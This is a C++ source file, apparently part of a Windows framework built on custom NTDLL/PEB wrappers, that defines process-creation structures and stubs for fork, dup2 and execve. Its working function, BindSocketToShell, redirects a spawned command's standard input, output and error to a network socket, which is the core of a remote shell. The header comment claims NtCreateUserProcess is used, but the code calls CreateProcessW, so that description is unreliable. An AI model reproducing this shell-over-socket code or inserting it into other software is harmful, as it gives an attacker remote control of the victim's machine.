/**
 * process.cc - Windows Process Execution Implementation
 *
 * Provides process creation with socket redirection via NTDLL.
 *
 * NOTE: Windows process creation with socket handle redirection is complex.
 * This implementation uses NtCreateUserProcess with redirected standard handles.
 */

#include "process.h"
#include "ntdll.h"
#include "kernel32.h"
#include "memory.h"
#include "peb.h"

// Process creation structures for Windows
struct PS_ATTRIBUTE
{
    USIZE Attribute;
    USIZE Size;
    union
    {
        USIZE Value;
        PVOID ValuePtr;
    };
    PUSIZE ReturnLength;
};

struct PS_ATTRIBUTE_LIST
{
    USIZE TotalLength;
    PS_ATTRIBUTE Attributes[2];
};

struct PS_CREATE_INFO
{
    USIZE Size;
    USIZE State;
    union
    {
        struct
        {
            union
            {
                UINT32 InitFlags;
                struct
                {
                    UINT8 WriteOutputOnExit : 1;
                    UINT8 DetectManifest : 1;
                    UINT8 IFEOSkipDebugger : 1;
                    UINT8 IFEODoNotPropagateKeyState : 1;
                    UINT8 SpareBits1 : 4;
                    UINT8 SpareBits2 : 8;
                    UINT16 ProhibitedImageCharacteristics;
                };
            };
            UINT32 AdditionalFileAccess;
        } InitState;

        struct
        {
            PVOID FileHandle;
        } FailSection;

        struct
        {
            UINT16 DllCharacteristics;
        } ExeFormat;

        struct
        {
            PVOID IFEOKey;
        } ExeName;

        struct
        {
            union
            {
                UINT32 OutputFlags;
                struct
                {
                    UINT8 ProtectedProcess : 1;
                    UINT8 AddressSpaceOverride : 1;
                    UINT8 DevOverrideEnabled : 1;
                    UINT8 ManifestDetected : 1;
                    UINT8 ProtectedProcessLight : 1;
                    UINT8 SpareBits1 : 3;
                    UINT8 SpareBits2 : 8;
                    UINT16 SpareBits3;
                };
            };
            PVOID FileHandle;
            PVOID SectionHandle;
            UINT64 UserProcessParametersNative;
            UINT32 UserProcessParametersWow64;
            UINT32 CurrentParameterFlags;
            UINT64 PebAddressNative;
            UINT32 PebAddressWow64;
            UINT64 ManifestAddress;
            UINT32 ManifestSize;
        } SuccessState;
    };
};

// Windows doesn't have fork() - use stub implementation
SSIZE Process::Fork() noexcept
{
    // Windows doesn't support fork()
    return PROCESS_INVALID_PID;
}

// Windows doesn't have dup2 in the same way - stub
SSIZE Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
{
    (void)oldfd;
    (void)newfd;
    return PROCESS_INVALID_PID;
}

// Windows doesn't have execve - stub
SSIZE Process::Execve(const CHAR *pathname, CHAR *const argv[], CHAR *const envp[]) noexcept
{
    (void)pathname;
    (void)argv;
    (void)envp;
    return PROCESS_INVALID_PID;
}

// Windows doesn't have setsid - stub
SSIZE Process::Setsid() noexcept
{
    return PROCESS_INVALID_PID;
}

SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
{
    if (socketFd < 0 || !cmd)
        return PROCESS_INVALID_PID;

    PVOID h = (PVOID)(USIZE)socketFd;

    // 1. CRITICAL: Make the handle inheritable
    if (!Kernel32::SetHandleInformation(h, 1 /*HANDLE_FLAG_INHERIT*/, 1))
        return PROCESS_INVALID_PID;

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = h;
    si.hStdOutput = h;
    si.hStdError = h;

    PROCESS_INFORMATION pi = {};
    WCHAR cmdWide[260];
    Kernel32::MultiByteToWideChar(CP_UTF8, 0, cmd, -1, cmdWide, 260);

    if (!Kernel32::CreateProcessW(
            nullptr, cmdWide, nullptr, nullptr,
            TRUE, // inherit handles
            0, nullptr, nullptr, &si, &pi))
    {
        return PROCESS_INVALID_PID;
    }

    // 2. Close the thread handle to prevent leaks
    NTDLL::NtClose(pi.hThread);

    return (SSIZE)pi.hProcess;
}